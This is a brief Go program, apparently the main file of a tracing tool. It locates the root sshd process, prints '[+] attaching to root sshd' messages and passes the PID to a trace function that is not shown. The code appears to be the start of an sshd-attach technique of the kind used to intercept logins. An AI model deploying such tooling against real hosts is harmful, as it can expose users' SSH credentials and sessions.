package main

import (
	"fmt"
	"os"

	"./ghostrace/ghost/process"
)

func run() error {
	// find sshd
	parentSshd, err := process.Filter(func(p process.Process) bool {
		if isSshd(p) {
			return isSshd(p) && !isSshd(p.Parent())
		}
		return false
	})
	if err != nil {
		return err
	}
	if len(parentSshd) != 1 {
		return fmt.Errorf("need (1) root sshd, found (%d)", len(parentSshd))
	}
	sshd := parentSshd[0].Pid()
	fmt.Printf("[+] started with pid [%d]\n", os.Getpid())
	fmt.Printf("[+] attaching to root sshd at [%d]\n", sshd)
	return trace(sshd)
}

func main() {
	if err := run(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
